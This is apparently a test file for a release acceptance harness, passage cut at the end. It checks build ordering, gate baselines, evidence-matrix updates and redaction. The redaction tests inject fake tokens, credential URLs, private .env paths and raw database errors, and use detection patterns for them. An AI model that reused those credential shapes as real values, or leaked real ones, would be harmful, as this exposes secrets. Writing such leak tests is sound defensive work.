/**
 * Tests for the OSS-B0 acceptance harness.
 *
 * Six things are worth proving here, and they are not the same thing:
 *
 * 1. **Redaction.** Six adversarial injections — a token, a private absolute
 *    path, a credential URL, a raw database error, a wrong resource label, a
 *    non-disposable database target — each has to fail closed, and the injected
 *    value must not appear anywhere in the report, not even truncated.
 * 2. **Orchestration.** A clean-tree fixture with no `apps/web/dist` records the
 *    command order and refuses to let a web test run before a successful build:
 *    the stub asserts against the filesystem, so the claim is not satisfiable by
 *    a comment. A deliberately failed build must stop the web suite and every
 *    downstream evidence mark.
 * 3. **The dependency gate is a member, not an extra.** It appears in the
 *    recorded order, it precedes the web build, a nonzero exit or a count below
 *    the baseline fails the whole harness, and neither is reported as a skip.
 * 4. **The safety red lines are the harness's, not the caller's.** It creates its
 *    own workspace root and control-plane state directory, refuses to run a single
 *    command without them, drops every inherited database alias and rewrites the
 *    three the suites read — asserted both as a pure policy and at the CLI
 *    boundary against a deliberately polluted environment.
 * 5. **Reachability.** Every check has a path to `verified`, and with every
 *    declared dependency closed and every command green the whole graph reaches
 *    `verified`. A gate no merged state could satisfy is not a gate; a `pending`
 *    is scoped to its stage, while a refusal gates both.
 * 6. **The artefacts are bound and bounded.** The report is validated against a
 *    key allowlist as well as scanned for disclosure shapes, and the evidence file
 *    is written only to a pre-approved in-checkout path, never over an existing
 *    file, only when every header placeholder has been replaced by a measured
 *    value.
 */
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { test } from "node:test";

import {
  ACCEPTANCE_CHECKS,
  COMMAND_TIMEOUT_MS,
  DATABASE_ALIASES,
  EVIDENCE_DESTINATION,
  HEADER_PLACEHOLDERS,
  REPORT_SCHEMA_VERSION,
  STAGES,
  applyEvidenceHeader,
  checkStage,
  closeWorkspace,
  createExclusive,
  dependenciesPresent,
  environmentPolicy,
  evidenceDestination,
  openWorkspace,
  reportDigest,
  reportSchemaViolations,
  residualPlaceholders,
  runIdentifier,
  OSS_B0_DOCUMENTS,
  COMPUTED_ROWS,
  DEPENDENCY_GATE_BASELINE,
  DISCLOSURE_SHAPES,
  EVIDENCE_ROWS,
  REASON_CLASSES,
  REPOSITORY_ROOT,
  STATUSES,
  applyAutomatedEvidence,
  automatedEvidence,
  buildReport,
  commandFailure,
  disposableTarget,
  childEnvironment,
  countedTests,
  forbiddenDisclosures,
  maintenanceUrl,
  nodeSatisfiesRange,
  ownershipLabel,
  overclaimingSentences,
  parseEvidenceMatrix,
  planOrder,
  SUPPORTED_NODE_RANGE,
  removableResources,
  reportDisclosures,
  targetSchema,
  runAcceptance,
  scannedSecretValues,
  unreachableTarget,
} from "./verify-oss-b0.mjs";

/**
 * Fixture values are assembled at run time. The public snapshot scanner is the
 * boundary this harness exists to defend, and it reads tracked source: a test
 * that planted a literal token, a literal connection string, or a literal
 * home-directory path would turn that boundary red in order to prove the harness
 * keeps it green. None of those shapes appears in this file's bytes.
 */
const TOKEN = ["gh", "p_", "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789"].join("");
const homePath = (...parts) => ["", "Users", "operator", ...parts].join("/");
const foreignHomePath = (...parts) => ["", "Users", "someone-else", ...parts].join("/");
const linuxHomePath = (...parts) => ["", "home", "ci", ...parts].join("/");
const connection = ({ scheme = "postgresql", user = "agentos", secret = "pw", host = "localhost",
  port = "55777", database = "agentos_test", query = "" } = {}) =>
  `${scheme}:${"//"}${user}:${secret}@${host}${port === "" ? "" : `:${port}`}/${database}${query}`;

const WEB_BUILD = "npm run build -w @anneal/web";
const WEB_TEST = "npm test -w @anneal/web";
const DEPENDENCY_GATE = "npm run test:dependency-gate";
const SECRET_HYGIENE = "npm run verify:secret-hygiene";
/** The scanner's clean line, which now says how large the search it ran was. */
const HYGIENE_CLEAN = (values) =>
  `secret-hygiene clean (3 bundle files, 903 tracked files, ${values} configured secret values)\n`;

const GATE_OUTPUT = (count) => `# tests ${count}\n# pass ${count}\n# fail 0\n`;

const fromTree = (path) => readFileSync(join(REPOSITORY_ROOT, path), "utf8");

const documentsFor = () => ({
  "package.json": fromTree("package.json"),
  "public-snapshot.json": fromTree("public-snapshot.json"),
  // The public repository does not ship the operator-only release rehearsal.
  // Pure graph tests supply a named fixture so the release-candidate branch
  // remains reachable without pretending the file exists in the public tree.
  "deploy/rehearse-postgres-release-migrate.sh": "# external rehearsal fixture\n",
  // Step 7's frozen fixture and the two parity suites that read it, from the
  // tree: E12's automated half is checked against the real artifacts.
  "docs/release/fixtures/oss-b0-smoke-task.json": fromTree("docs/release/fixtures/oss-b0-smoke-task.json"),
  "packages/api/src/smoke-fixture.test.ts": fromTree("packages/api/src/smoke-fixture.test.ts"),
  "apps/web/src/tests/smoke-fixture.test.tsx": fromTree("apps/web/src/tests/smoke-fixture.test.tsx"),
  // Step 9's ledger exists as a stub here and its checker does not, which is the
  // state E14 must report as pending rather than as a passing review.
  "docs/reviews/2026-08-19-oss-b0-v0.1.0-independent-review.md": "# ledger\n",
  // Step 7's published page, read from the tree: the probe is checked against
  // the real document, not against a fixture that agrees with it.
  "docs/release/migration-and-recovery.md": fromTree("docs/release/migration-and-recovery.md"),
});

/**
 * A tree that looks like a clean checkout at the start of an acceptance run:
 * everything the harness reads, and no `apps/web/dist`.
 */
const cleanTree = () => {
  const root = mkdtempSync(join(tmpdir(), "oss-b0-harness-"));
  mkdirSync(join(root, "apps", "web"), { recursive: true });
  return root;
};

/**
 * The stub runner. It records order, satisfies each command's contract, and
 * asserts the one ordering invariant against the filesystem rather than against
 * its own bookkeeping: a web test may only run when the bundle exists.
 */
const stubRunner = ({ root, failBuild = false, gate = {}, hygiene = {}, inject = {}, rehearsal = {} } = {}) => {
  const dist = join(root, "apps", "web", "dist", "index.js");
  const order = [];
  const violations = [];
  const run = (argv) => {
    const command = argv.join(" ");
    order.push(command);
    if (Object.hasOwn(inject, command)) return inject[command];
    if (command === WEB_BUILD) {
      if (failBuild) return { status: 1, stdout: "vite: build failed\n", stderr: "" };
      mkdirSync(dirname(dist), { recursive: true });
      writeFileSync(dist, "// bundle\n", "utf8");
      return { status: 0, stdout: "vite build ok\n", stderr: "" };
    }
    if (command === WEB_TEST) {
      if (!existsSync(dist)) violations.push("web test ran before a successful web build");
      return { status: 0, stdout: GATE_OUTPUT(12), stderr: "" };
    }
    if (command === DEPENDENCY_GATE) {
      return {
        status: gate.status ?? 0,
        stdout: GATE_OUTPUT(gate.count ?? DEPENDENCY_GATE_BASELINE),
        stderr: "",
      };
    }
    if (command === SECRET_HYGIENE) {
      return { status: 0, stdout: HYGIENE_CLEAN(hygiene.values ?? 2), stderr: "" };
    }
    if (command === "npm run setup:local -- --dry-run") {
      return { status: 0, stdout: "setup:local dry-run would-write\n", stderr: "" };
    }
    if (command === "zsh deploy/rehearse-postgres-release-migrate.sh") {
      // The verdict lines the real script emits, with its own prefix. Both the
      // summary verdict and the existing-mode line are overridable, because the
      // rehearsal prints its summary lines only *after* its own failure gate:
      // E8 has to read the pair, not either one alone.
      // `undefined` is today's real verdict; an explicit `null` is a rehearsal
      // that printed no such line at all.
      const existing = Object.hasOwn(rehearsal, "existingMode")
        ? rehearsal.existingMode
        : "existing-mode=exercised-end-to-end-against-an-attested-bundle applied=19";
      const result = Object.hasOwn(rehearsal, "result") ? rehearsal.result : "result=pass";
      const lines = [
        ...(result === null ? [] : [result]),
        "fresh-migration=exercised-end-to-end-under-the-maintenance-lock applied=19",
        ...(existing === null ? [] : [existing]),
      ].map((line) => `rehearse-release-migrate ${line}`);
      return { status: 0, stdout: `${lines.join("\n")}\n`, stderr: "" };
    }
    return { status: 0, stdout: "ok\n", stderr: "" };
  };
  return { run, order, violations, dist };
};

const fullRun = (options = {}) => {
  const root = options.root ?? cleanTree();
  const stub = stubRunner({ root, ...options });
  const run = runAcceptance({
    run: stub.run,
    ...(options.repositoryPath === undefined ? {} : { repositoryPath: options.repositoryPath }),
    environment: options.environment ?? { nodeSupported: true, redLines: true },
    documents: { ...documentsFor(), ...(options.documents ?? {}) },
    secretValues: options.secretValues ?? [],
    target: options.target ?? { ok: true },
    label: options.label ?? "oss-b0-verify-fixture",
    ...(options.stage === undefined ? {} : { stage: options.stage }),
  });
  return { root, stub, run, statusOf: (id) => run.records.find((entry) => entry.check === id) };
};

const reportOf = (run, runId = "0123456789abcdef") =>
  buildReport({
    commit: "0".repeat(40),
    architecture: "arm64",
    osMajor: "25",
    nodeMajor: "22",
    runId,
    run,
  });

/** A workspace record shaped like the one `openWorkspace` returns, for the pure
 *  environment-policy tests. Nothing here touches the filesystem. */
const workspaceFixture = {
  ok: true,
  root: "/var/folders/scratch/oss-b0-verify-fixture-000",
  workspaceRoot: "/var/folders/scratch/oss-b0-verify-fixture-000/runs",
  controlPlaneStateDir: "/var/folders/scratch/oss-b0-verify-fixture-000/control-plane",
};

// ---------------------------------------------------------------------------
// The declared graph
// ---------------------------------------------------------------------------

test("the dependency graph is acyclic and every prerequisite exists", () => {
  const order = planOrder();
  assert.equal(order.length, ACCEPTANCE_CHECKS.length);
  const seen = new Set();
  for (const check of order) {
    for (const need of check.needs) assert.ok(seen.has(need), `${check.id} scheduled before ${need}`);
    seen.add(check.id);
  }
});

test("no web test is scheduled before the web build, by dependency and not by luck", () => {
  const ids = planOrder().map((check) => check.id);
  assert.ok(ids.indexOf("web-build") < ids.indexOf("web-tests"));
  const webTests = ACCEPTANCE_CHECKS.find((check) => check.id === "web-tests");
  assert.ok(webTests.needs.includes("web-build"),
    "the web suite must *depend on* the build, so a reordering cannot separate them");
  // The bundle scan is about the built artefact too.
  assert.ok(ACCEPTANCE_CHECKS.find((check) => check.id === "secret-hygiene").needs.includes("web-build"));
});

test("the dependency gate runs before the web build and is not substituted by the snapshot scan", () => {
  const ids = planOrder().map((check) => check.id);
  assert.ok(ids.indexOf("dependency-gate") < ids.indexOf("web-build"));
  const gate = ACCEPTANCE_CHECKS.find((check) => check.id === "dependency-gate");
  assert.deepEqual(gate.commands, [["npm", "run", "test:dependency-gate"]]);
  assert.equal(gate.countBaseline, DEPENDENCY_GATE_BASELINE);
  for (const check of ACCEPTANCE_CHECKS) {
    const commands = check.commands.map((argv) => argv.join(" "));
    if (check.id === "snapshot-scan") continue;
    assert.ok(!commands.some((command) => command.includes("snapshot:scan")),
      `${check.id} must not stand in for another check`);
  }
});

test("the recorded dependency-gate baseline remains explicit", () => {
  assert.equal(DEPENDENCY_GATE_BASELINE, 15);
});

test("the real root script this harness invokes still exists and still runs both suites", () => {
  const root = JSON.parse(readFileSync(join(REPOSITORY_ROOT, "package.json"), "utf8"));
  assert.equal(root.scripts["verify:oss-b0"], "node scripts/verify-oss-b0.mjs");
  const gate = root.scripts["test:dependency-gate"];
  assert.ok(gate.includes("scripts/goal-5a0-dependency-gate.test.mjs"));
  assert.ok(gate.includes("scripts/goal-5a0-handoff-preimage.test.mjs"));
});

// ---------------------------------------------------------------------------
// Clean-tree orchestration
// ---------------------------------------------------------------------------

test("a clean tree with no bundle builds the web app before its first web test", () => {
  const root = cleanTree();
  assert.ok(!existsSync(join(root, "apps", "web", "dist")), "the fixture must start with no bundle");
  const { stub, run, statusOf } = fullRun({ root });

  assert.deepEqual(stub.violations, []);
  const buildAt = stub.order.indexOf(WEB_BUILD);
  const testAt = stub.order.indexOf(WEB_TEST);
  assert.ok(buildAt !== -1 && testAt !== -1);
  assert.ok(buildAt < testAt, "the build must be recorded before the first web test");
  assert.ok(existsSync(stub.dist));
  assert.equal(statusOf("web-build").status, "verified");
  assert.equal(statusOf("web-tests").status, "verified");

  assert.ok(stub.order.includes(DEPENDENCY_GATE), "the dependency gate must appear in the command order");
  assert.ok(stub.order.indexOf(DEPENDENCY_GATE) < buildAt);
  assert.equal(run.commandOrder.join("\n"), stub.order.join("\n"));
});

test("a deliberately failed web build stops the web suite and every downstream mark", () => {
  const { stub, run, statusOf } = fullRun({ failBuild: true });

  assert.equal(statusOf("web-build").status, "refused");
  assert.equal(statusOf("web-build").reason, "command-exit-nonzero");
  assert.ok(!stub.order.includes(WEB_TEST), "the web suite must never be reached");
  for (const id of ["web-tests", "secret-hygiene", "snapshot-scan", "smoke-fixture-parity"]) {
    assert.equal(statusOf(id).status, "blocked", `${id} must be blocked`);
    assert.equal(statusOf(id).reason, "prerequisite-refused");
  }
  const marks = automatedEvidence(run.records);
  for (const row of ["E5", "E6", "E15", "E12"]) {
    assert.equal(marks[row], undefined, `${row} must not be marked when the build failed`);
  }
  assert.equal(run.result, "refused");
});

test("a nonzero dependency gate fails the whole harness and is never reported as a skip", () => {
  const { run, statusOf } = fullRun({ gate: { status: 1 } });
  const gate = statusOf("dependency-gate");
  assert.equal(gate.status, "refused");
  assert.equal(gate.reason, "command-exit-nonzero");
  assert.equal(run.result, "refused");
  assert.equal(automatedEvidence(run.records).E15a, undefined);
  const serialised = JSON.stringify(reportOf(run));
  assert.ok(!/skip/iu.test(serialised), "the report has no skip vocabulary at all");
  assert.ok(!STATUSES.includes("skipped"));
});

test("a reduced test count fails the gate the same way a nonzero exit does", () => {
  const { run, statusOf } = fullRun({ gate: { count: DEPENDENCY_GATE_BASELINE - 1 } });
  const gate = statusOf("dependency-gate");
  assert.equal(gate.status, "refused");
  assert.equal(gate.reason, "test-count-below-baseline");
  assert.equal(run.result, "refused");
  // Downstream of the gate, so the build and everything after it stops too.
  assert.equal(statusOf("web-build").status, "blocked");
  assert.equal(statusOf("web-tests").status, "blocked");
});

test("an unparseable gate summary is a refusal, not an assumed pass", () => {
  const { statusOf } = fullRun({ inject: { [DEPENDENCY_GATE]: { status: 0, stdout: "all good\n", stderr: "" } } });
  assert.equal(statusOf("dependency-gate").reason, "test-count-below-baseline");
});

test("a gate count above the baseline is accepted and its count is recorded", () => {
  const { statusOf } = fullRun({ gate: { count: DEPENDENCY_GATE_BASELINE + 4 } });
  const gate = statusOf("dependency-gate");
  assert.equal(gate.status, "verified");
  assert.equal(gate.commands[0].tests, DEPENDENCY_GATE_BASELINE + 4);
});

test("a command that cannot be launched is a refusal", () => {
  const { statusOf, run } = fullRun({ inject: { [WEB_BUILD]: { status: null, stdout: "", stderr: "" } } });
  assert.equal(statusOf("web-build").reason, "command-unavailable");
  assert.equal(run.result, "refused");
});

test("launch failure, output overflow and timeout are three different reasons", () => {
  assert.equal(commandFailure({ status: 0 }), null);
  assert.equal(commandFailure({ status: 3 }), "command-exit-nonzero");
  assert.equal(commandFailure({ status: null, error: { code: "ENOENT" } }), "command-unavailable");
  assert.equal(commandFailure({ status: null, error: { code: "ENOBUFS" } }), "command-output-overflow");
  assert.equal(commandFailure({ status: null, error: { code: "ETIMEDOUT" } }), "command-timed-out");
  assert.equal(commandFailure({ status: null, signal: "SIGKILL" }), "command-timed-out");
  assert.equal(commandFailure({ status: null }), "command-unavailable");
  for (const reason of ["command-unavailable", "command-output-overflow", "command-timed-out"]) {
    assert.ok(REASON_CLASSES.includes(reason));
  }
});

test("a suite killed at the command ceiling is a refusal, not a pass", () => {
  const { statusOf, run } = fullRun({
    inject: { "npm run test:db -w @anneal/db": { status: null, signal: "SIGKILL", stdout: "", stderr: "" } },
  });
  assert.equal(statusOf("database-fixtures").reason, "command-timed-out");
  assert.equal(run.result, "refused");
  assert.ok(COMMAND_TIMEOUT_MS > 0);
});

// ---------------------------------------------------------------------------
// Adversarial injections. Each must fail closed *and* not echo the value.
// ---------------------------------------------------------------------------

const INJECTIONS = [
  {
    name: "an operator token",
    value: TOKEN,
    reason: "credential-in-output",
  },
  {
    name: "a private absolute path",
    value: homePath("Documents", "claude_projects", "agentos", ".env"),
    reason: "private-path-in-output",
  },
  {
    name: "a credential URL",
    value: connection({ secret: "s3cr3t-p4ssw0rd" }),
    reason: "credential-url-in-output",
  },
  {
    name: "a raw database error",
    value: 'PrismaClientKnownRequestError: relation "Goal" does not exist',
    reason: "raw-database-error-in-output",
  },
];

for (const injection of INJECTIONS) {
  test(`${injection.name} in command output fails closed without being echoed`, () => {
    const { run, statusOf } = fullRun({
      inject: { [WEB_BUILD]: { status: 0, stdout: `building\n${injection.value}\n`, stderr: "" } },
      secretValues: [TOKEN],
    });
    const build = statusOf("web-build");
    assert.equal(build.status, "refused");
    assert.equal(build.reason, injection.reason);
    assert.equal(run.result, "refused");
    // The web suite is downstream of the build, so a poisoned build cannot be
    // laundered into a pass by the next check.
    assert.equal(statusOf("web-tests").status, "blocked");

    const serialised = JSON.stringify(reportOf(run));
    assert.ok(!serialised.includes(injection.value), "the injected value must not reach the report");
    for (const fragment of injection.value.split(/[/:@\s]+/u).filter((part) => part.length >= 8)) {
      assert.ok(!serialised.includes(fragment), `no fragment of the injected value may survive: ${fragment}`);
    }
    assert.ok(REASON_CLASSES.includes(build.reason));
  });
}

test("a token that matches no known shape is still caught when it is a known secret value", () => {
  const secret = "correct-horse-battery-staple-4711";
  const { statusOf } = fullRun({
    inject: { [WEB_BUILD]: { status: 0, stdout: `bundled ${secret}\n`, stderr: "" } },
    secretValues: [secret],
  });
  assert.equal(statusOf("web-build").reason, "credential-in-output");
  assert.ok(!JSON.stringify(statusOf("web-build")).includes(secret));
});

test("disclosure classification returns classes only, in a stable order", () => {
  const classes = forbiddenDisclosures(
    [connection({ scheme: "postgres", user: "u", secret: "p", port: "" }),
      homePath("evidence"), "SQLSTATE", TOKEN].join(" "), []);
  assert.deepEqual(classes, DISCLOSURE_SHAPES.map((shape) => shape.reason));
  assert.deepEqual(forbiddenDisclosures("nothing to see", []), []);
  assert.deepEqual(forbiddenDisclosures(undefined, ["x"]), []);
});

test("a non-disposable database target fails closed and nothing about it is recorded", () => {
  const operator = connection({ secret: "s3cr3t-p4ssw0rd", port: "5432", database: "agentos" });
  const verdict = disposableTarget({ url: operator, allowScratch: "1" });
  assert.deepEqual(verdict, { ok: false, reason: "target-not-disposable" });

  const { run, statusOf } = fullRun({ target: verdict });
  const fixtures = statusOf("database-fixtures");
  assert.equal(fixtures.status, "refused");
  assert.equal(fixtures.reason, "target-not-disposable");
  assert.equal(run.result, "refused");
  const serialised = JSON.stringify(reportOf(run));
  assert.ok(!serialised.includes("s3cr3t-p4ssw0rd"));
  assert.ok(!serialised.includes("5432"));
  assert.ok(!serialised.includes("agentos_test"));
  assert.equal(automatedEvidence(run.records).E9, undefined);
});

test("every non-disposable target shape is refused, and the scratch contract is honoured", () => {
  const label = "oss-b0-verify-deadbeef";
  const scratch = connection({ query: "?schema=public" });
  const accepted = disposableTarget({ url: scratch, allowScratch: "1", label });
  assert.equal(accepted.ok, true);
  assert.ok(accepted.url.endsWith(`schema=${label}`),
    "the harness names its own schema, so the only schema the suites can drop is this run's");
  for (const [url, allowScratch, reason] of [
    [scratch, undefined, "target-not-disposable"],
    [scratch, "0", "target-not-disposable"],
    [connection({ host: "db.example.com", database: "agentos" }), "1", "target-not-disposable"],
    [connection({ port: "", database: "agentos" }), "1", "target-not-disposable"],
    [connection({ scheme: "mysql", database: "agentos" }), "1", "target-not-disposable"],
    ["not a url", "1", "target-not-disposable"],
    [undefined, "1", "dependency-unavailable"],
  ]) {
    assert.deepEqual(disposableTarget({ url, allowScratch, label }), { ok: false, reason },
      `expected ${reason} for ${String(url)} with opt-in ${String(allowScratch)}`);
  }
});

test("a resource carrying the wrong ownership label is never removed", () => {
  const label = ownershipLabel("deadbeef");
  assert.equal(label, "oss-b0-verify-deadbeef");
  const mine = [`${label}-postgres`, `${label}-volume`];
  assert.deepEqual(removableResources(mine, label), { ok: true, removable: mine });

  const foreign = [`${label}-postgres`, "agentos-postgres-1"];
  const verdict = removableResources(foreign, label);
  assert.equal(verdict.ok, false);
  assert.equal(verdict.reason, "ownership-label-mismatch");
  assert.deepEqual(verdict.removable, [], "not even the correctly labelled resource is removed");
  assert.ok(!JSON.stringify(verdict).includes("agentos-postgres-1"));
});

test("each generated ownership label is unique to its run", () => {
  const labels = new Set(Array.from({ length: 32 }, () => ownershipLabel()));
  assert.equal(labels.size, 32);
  for (const label of labels) assert.match(label, /^oss-b0-verify-[0-9a-f]{8}$/u);
});

// ---------------------------------------------------------------------------
// E5's scope claim (Step 9 finding S-3)
// ---------------------------------------------------------------------------

test("a clean scan says how many configured values it searched for, and the count is carried", () => {
  const { run, statusOf } = fullRun({ hygiene: { values: 2 } });
  const hygiene = statusOf("secret-hygiene");
  assert.equal(hygiene.status, "verified");
  assert.deepEqual(hygiene.commands[0], {
    command: SECRET_HYGIENE, status: "verified", secretValues: 2,
  });
  // A count, and only a count: the report is the artifact E5 is read from.
  const entry = reportOf(run).checks.find((row) => row.check === "secret-hygiene");
  assert.equal(entry.commands[0].secretValues, 2);
  assert.equal(scannedSecretValues(HYGIENE_CLEAN(0)), 0, "an empty search is stated, not hidden");
  assert.equal(scannedSecretValues("secret-hygiene clean (3 bundle files, 903 tracked files)\n"), null);
});

test("a clean line that will not say what it searched for cannot mark E5", () => {
  const { run, statusOf } = fullRun({
    inject: {
      [SECRET_HYGIENE]: {
        status: 0,
        stdout: "secret-hygiene clean (3 bundle files, 903 tracked files)\n",
        stderr: "",
      },
    },
  });
  const hygiene = statusOf("secret-hygiene");
  assert.equal(hygiene.status, "refused");
  assert.equal(hygiene.reason, "assertion-failed");
  // Exit 0 from the scanner is not the evidence; the stated scope is.
  assert.deepEqual(hygiene.commands.map((entry) => entry.status), ["verified", "verified"]);
  const after = parseEvidenceMatrix(applyAutomatedEvidence(template(), run.records));
  assert.equal(after.find((row) => row.id === "E5").automated, "Pending",
    "E5 is left pending rather than marked green");
});

// ---------------------------------------------------------------------------
// The report schema
// ---------------------------------------------------------------------------

test("the report carries only classes, identifiers and counts", () => {
  const { run } = fullRun();
  const report = reportOf(run);
  assert.deepEqual(Object.keys(report).sort(), [
    "architecture", "automatedEvidence", "checks", "commandOrder", "commit",
    "dependencyGateBaseline", "harness", "nodeMajor", "osMajor", "result",
    "runId", "schemaVersion", "stage",
  ]);
  // The ownership label names a schema and a directory, and Step 8 excludes
  // database and container names: the report correlates runs by an identifier
  // that is not the name of anything.
  assert.equal(report.runId, "0123456789abcdef");
  assert.ok(!JSON.stringify(report).includes(run.label));
  for (const entry of report.checks) {
    assert.ok(STATUSES.includes(entry.status));
    if (entry.reason !== undefined) assert.ok(REASON_CLASSES.includes(entry.reason));
    assert.deepEqual(Object.keys(entry).filter((key) => ![
      "check", "status", "reason", "dependency", "stage", "evidence", "commands",
    ].includes(key)), []);
    for (const command of entry.commands) {
      assert.deepEqual(
        Object.keys(command).filter((key) =>
          !["command", "status", "reason", "tests", "secretValues"].includes(key)),
        [],
      );
      // The two counts a command may carry are counts, never a value or a name.
      for (const key of ["tests", "secretValues"]) {
        if (command[key] !== undefined) assert.ok(Number.isInteger(command[key]));
      }
    }
  }
  const serialised = JSON.stringify(report);
  for (const shape of [/\/Users\//u, /\/home\//u, /:\/\/[^\s"]*:[^\s"]*@/u, /github\.com/u, /5432/u, /ghp_/u]) {
    assert.ok(!shape.test(serialised), `report must not carry ${String(shape)}`);
  }
});

test("a pending dependency is reported as pending, never as verified or skipped", () => {
  // The release-candidate gate, where the row still waiting on an unmerged
  // artefact is in scope: Step 9's review ledger and its checker.
  const { run, statusOf } = fullRun({ stage: "release-candidate" });
  const review = statusOf("independent-review");
  assert.equal(review.status, "pending");
  assert.equal(review.dependency, "step-9-independent-review");
  assert.equal(automatedEvidence(run.records).E14, undefined);
  assert.equal(run.result, "pending");
  assert.ok(!JSON.stringify(reportOf(run)).includes("skip"));
});

test("a pending prerequisite blocks without being counted as a candidate failure", () => {
  // The public tree does not ship the operator-only rehearsal, so the row that
  // spawns it is pending on a file rather than on a candidate failure.
  const documents = documentsFor();
  delete documents["deploy/rehearse-postgres-release-migrate.sh"];
  const stub = stubRunner({ root: cleanTree() });
  const run = runAcceptance({
    run: stub.run,
    environment: { nodeSupported: true, redLines: true },
    documents,
    target: { ok: true },
    label: "oss-b0-verify-fixture",
    stage: "release-candidate",
  });
  const statusOf = (id) => run.records.find((entry) => entry.check === id);
  assert.equal(statusOf("release-migration").status, "pending");
  assert.equal(statusOf("release-migration-existing-mode").reason, "dependency-unavailable");
  assert.equal(run.result, "pending");
});

test("the release rehearsal runs without any recorded signing authority", () => {
  // The Ed25519 release-authority layer is retired: nothing in the environment
  // gates this row any more, so a release-candidate run with a present
  // rehearsal spawns it and reads its verdict.
  const { stub, statusOf } = fullRun({ stage: "release-candidate" });
  assert.equal(statusOf("release-migration").status, "verified");
  assert.ok(stub.order.includes("zsh deploy/rehearse-postgres-release-migrate.sh"));
});

test("an unsupported Node version stops the run at the first check", () => {
  const { stub } = fullRun({});
  const unsupported = runAcceptance({
    run: stub.run,
    environment: { nodeSupported: false, redLines: true },
    documents: documentsFor(),
    target: { ok: true },
    label: "oss-b0-verify-fixture",
  });
  assert.equal(unsupported.records[0].check, "node-version");
  assert.equal(unsupported.records[0].status, "refused");
  assert.equal(unsupported.result, "refused");
  assert.deepEqual(automatedEvidence(unsupported.records), {});
});

test("node:test summaries are counted from the summary line, not from guesses", () => {
  assert.equal(countedTests("ℹ tests 15\nℹ pass 15\n"), 15);
  assert.equal(countedTests("# tests 48\n# pass 48\n"), 48);
  assert.equal(countedTests("no summary"), null);
  assert.equal(countedTests(undefined), null);
});

// ---------------------------------------------------------------------------
// The evidence document
// ---------------------------------------------------------------------------

const template = () => [
  "# OSS-B0 evidence fixture",
  "",
  "- Release candidate commit: `<40-hex>`",
  "- Harness report: `npm run verify:oss-b0 -- --json`",
  "- Architecture / OS major: `<arch>` / `<major>`",
  "",
  "The matrix uses an exact conjunction: success in only one required channel is not a pass.",
  "There is no `or` shortcut, and `N/A` can never satisfy a required field.",
  "E16 is **computed**, never hand-promoted. `N/A` is literal.",
  "The harness exits `0` only for Verified evidence.",
  "Claim states: Verified, Maintainer-verified, Pending, Experimental, Unverified, Unsupported.",
  "Maintainer fields remain <yes/no>, <name>, and <YYYY-MM-DD>.",
  "",
  "| ID | Claim/check | Evidence source | Automated evidence | Maintainer evidence | Claim state |",
  "|---|---|---|---|---|---|",
  ...EVIDENCE_ROWS.map((row) => {
    const claim = row.id === "E17" ? "Unsupported" : row.id === "E16" ? "Pending until Step 10" : "Pending";
    return `| ${row.id} | fixture | fixture | ${row.automated ? "Pending" : "N/A"} | ${row.maintainer ? "Pending" : "N/A"} | ${claim} |`;
  }),
  "",
].join("\n");

test("the template carries every matrix row with two separate proof fields", () => {
  const rows = parseEvidenceMatrix(template());
  assert.deepEqual(rows.map((row) => row.id), EVIDENCE_ROWS.map((row) => row.id));
  for (const row of rows) {
    const declared = EVIDENCE_ROWS.find((entry) => entry.id === row.id);
    assert.equal(row.automated, declared.automated ? "Pending" : "N/A",
      `${row.id} automated field must start ${declared.automated ? "Pending" : "N/A"}`);
    assert.equal(row.maintainer, declared.maintainer ? "Pending" : "N/A",
      `${row.id} maintainer field must start ${declared.maintainer ? "Pending" : "N/A"}`);
  }
  assert.equal(rows.find((row) => row.id === "E17").claim, "Unsupported");
  assert.equal(rows.find((row) => row.id === "E16").claim, "Pending until Step 10");
});

test("the harness advances only automated fields, and only for verified checks", () => {
  const { run } = fullRun();
  const filled = applyAutomatedEvidence(template(), run.records);
  const before = parseEvidenceMatrix(template());
  const after = parseEvidenceMatrix(filled);

  for (const [index, row] of after.entries()) {
    assert.equal(row.maintainer, before[index].maintainer, `${row.id} maintainer field must be untouched`);
    assert.equal(row.claim, before[index].claim, `${row.id} claim state must be untouched`);
    if (before[index].automated === "N/A") assert.equal(row.automated, "N/A", `${row.id} must stay N/A`);
    assert.ok(["Pending", "Verified", "N/A"].includes(row.automated));
  }
  assert.equal(after.find((row) => row.id === "E15a").automated, "Verified");
  assert.equal(after.find((row) => row.id === "E3").automated, "Verified");
  // E12's automated half is the merged fixture-parity pair, so it advances here.
  assert.equal(after.find((row) => row.id === "E12").automated, "Verified");
  // E8's artefact — OSS-D's attestation producer — merged, and the rehearsal now
  // spends it, so this row advances from the verdict the script actually prints.
  assert.equal(after.find((row) => row.id === "E8").automated, "Verified");
  // Waiting on an artefact that has not merged: pending stays pending.
  assert.equal(after.find((row) => row.id === "E14").automated, "Pending");
});

test("E16 cannot be promoted by the harness under any verdict", () => {
  assert.deepEqual(COMPUTED_ROWS, ["E16"]);
  const everythingVerified = EVIDENCE_ROWS.map((row) => ({
    check: `synthetic-${row.id}`, status: "verified", evidence: [row.id], commands: [],
  }));
  const marks = automatedEvidence(everythingVerified);
  assert.equal(marks.E16, undefined);
  const filled = applyAutomatedEvidence(template(), everythingVerified);
  const e16 = parseEvidenceMatrix(filled).find((row) => row.id === "E16");
  assert.equal(e16.automated, "N/A");
  assert.equal(e16.maintainer, "Pending");
  // Rows the plan declares maintainer-only keep their automated N/A as well.
  for (const id of ["E1", "E2", "E13", "E17"]) {
    assert.equal(parseEvidenceMatrix(filled).find((row) => row.id === id).automated, "N/A");
  }
});

test("a row carried by two checks is verified only when both verified", () => {
  const rows = automatedEvidence([
    { check: "api-tests", status: "verified", evidence: ["E6"], commands: [] },
    { check: "web-tests", status: "blocked", evidence: ["E6"], commands: [] },
  ]);
  assert.equal(rows.E6, undefined);
});

test("the template documents the conjunction rule and the exit codes", () => {
  const text = template();
  for (const phrase of [
    "exact conjunction", "no `or` shortcut", "`N/A` is literal",
    "computed", "exits `0` only", "Maintainer-verified",
  ]) {
    assert.ok(text.includes(phrase), `the template must state: ${phrase}`);
  }
  // Every claim-state word the plan defines is named in the document.
  for (const state of ["Verified", "Maintainer-verified", "Pending", "Experimental", "Unverified", "Unsupported"]) {
    assert.ok(text.includes(state));
  }
});

// ---------------------------------------------------------------------------
// The real gate, so the baseline is a measurement and not a claim
